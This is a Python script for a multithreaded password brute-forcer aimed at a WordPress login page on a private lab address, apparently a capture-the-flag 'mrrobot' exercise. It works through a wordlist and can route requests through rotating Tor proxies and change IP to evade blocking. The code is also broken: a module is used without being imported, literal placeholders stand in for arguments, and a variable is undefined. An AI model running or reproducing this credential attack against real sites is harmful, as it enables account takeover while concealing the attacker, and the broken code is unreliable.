#!/usr/bin/env python3

from threading import Thread
from time import time
from Dependincies import useProxies
from time import sleep

from Dependincies import EndTor
from Dependincies import GetNewIp
from Dependincies import MakeTorProxies


UseProxies = useProxies.UseProxies

class Main:
    def __init__(self, password_path: str, number_of_proxies_and_threads: int, website_uri: str, indicator: str, tor: bool):
        self.num_of_proxies_and_threads = number_of_proxies_and_threads
        self.website = website_uri
        self.tor_status = tor
        if indicator.startswith('u'):
            self.result = [indicator[0], indicator[1:]]
        elif indicator.startswith('s'):
            self.result = [indicator[0], indicator[1:]]
        if tor:
            self.tor = MakeTorProxies.Make()
            self.tor.config_multiple_tor_proxies(self.num_of_proxies_and_threads)
        with open(password_path, 'r') as file:
            self.lines = file.readlines()
        self.used = []
        self.t_used = []
        self.unused = []
        self.timeout_dict_1 = {}  # Remove when done with the project ##EXPERMENTAL ##NOT NEEDED
        self.timeout_list = []
        self.run = False
        self.restarting = False
        for x in self.lines:
            self.unused.append(x.strip())

    def main(self):
        self.run = True
        self.t1 = time()
        print('\n')
        try:
            if not self.tor_status:
                with concurrent.futures.ThreadPoolExecutor(max_workers=self.num_of_proxies_and_threads) as executor:
                    futures = [executor.submit(self.temp, i) for i in range(self.num_of_proxies_and_threads)]
                    concurrent.futures.wait(futures)
            elif self.tor_status:
                with concurrent.futures.ThreadPoolExecutor(max_workers=self.num_of_proxies_and_threads) as executor:
                    futures = [executor.submit(self.temp_w_tor, i) for i in range(self.num_of_proxies_and_threads)]
                    concurrent.futures.wait(futures)
            if self.tor_status:
                self.reset_everything_and_try_again()


        finally:
            print('\n[*] Closing threads...')
            self.run = False
            print(f"[!] Tried {len(self.used)} passwords.")
            print(f"[+] Finished requests in {round(time() - self.t1, 2)} seconds\n")
            exit()



    def reset_everything_and_try_again(self):
        if not self.restarting and len(self.timeout_list) >= 10:
            self.restarting = True
            self.run = False
            print(f"\n\n\n[-] Got too many timeouts ({len(self.timeout_list)} restarting TOR and retrying from where we started)\n")
            EndTor.end()
            sleep(2)
            self.tor.config_multiple_tor_proxies(self.num_of_proxies_and_threads)
            self.lines = []
            self.lines = self.unused
            self.timeout_list = []
            self.used = []
            self.restarting = False
            self.main()


    def temp(self, z):
        self.run = True
        total_lines = len(self.lines)
        start = z * (total_lines // self.num_of_proxies_and_threads)
        end = (z + 1) * (total_lines // self.num_of_proxies_and_threads)
        start_line = max(1, min(start, total_lines))
        end_line = min(end, total_lines)

        # Adjusting indices to match Python's 0-based indexing
        start_index = start_line - 1
        end_index = end_line

        # Reading lines between start_index and end_index
        selected_lines = self.lines[start_index+1:end_index]
        while self.run is True:
            for password in selected_lines:
                if len(self.timeout_list) >= 10 or not self.run:
                    self.run = False
                    break
                if password in self.used:
                    continue
                password = password.strip()
                r = UseProxies(self.website, **YOUR DATA HERE**, self.tor_status)
                r.thread(self.result)
                self.used.append(password)
                self.unused.remove(password)
                print(
                    f"\033[2A\033[K[!] Trying {round(len(self.used) / (time() - self.t1), 3)} request(s) per second\n[!] Finished {len(self.used)}/{total_lines}\n[+] Requested {password}",
                    end='\r')
    def temp_w_tor(self, z):
        self.run = True
        total_lines = len(self.lines)
        start = z * (total_lines // self.num_of_proxies_and_threads)
        end = (z + 1) * (total_lines // self.num_of_proxies_and_threads)
        start_line = max(1, min(start, total_lines))
        end_line = min(end, total_lines)

        # Adjusting indices to match Python's 0-based indexing
        start_index = start_line - 1
        end_index = end_line

        # Reading lines between start_index and end_index
        selected_lines = self.lines[start_index+1:end_index]
        while self.run is True:
            for password in selected_lines:
                if len(self.timeout_list) >= 10 or not self.run:
                    self.run = False
                    break
                if password in self.used:
                    continue
                password = password.strip()
                r = UseProxies(self.website, **YOUR DATE HERE**, z + 9052)
                try:
                    if not tor_status:
                        r.thread(self.result)
                    elif tor_status:
                        r.thread_w_tor(self.result)
                except StopAsyncIteration:
                    self.timeout_dict_1[password] = z + 9052
                    self.timeout_list.append(password)
                    continue
                except OverflowError:
                    EndTor.end()
                    self.timeout_list = []
                    self.timeout_dict_1 = {}
                    self.run = False
                    break
                self.used.append(password)
                self.unused.remove(password)
                print(
                    f"\033[2A\033[K[!] Trying {round(len(self.used) / (time() - self.t1), 3)} request(s) per second\n[!] Finished {len(self.used)}/{total_lines}\n[+] Requested {password} from TOR on port {z + 9052}",
                    end='\r')
                GetNewIp.main(z)


if __name__ == '__main__':
    main = Main('/root/Game_Zone/Starters/mrrobot/sotred.dic', 30, 'https://10.10.74.90/wp-login.php', 'uincorrect', False)
    main.main()
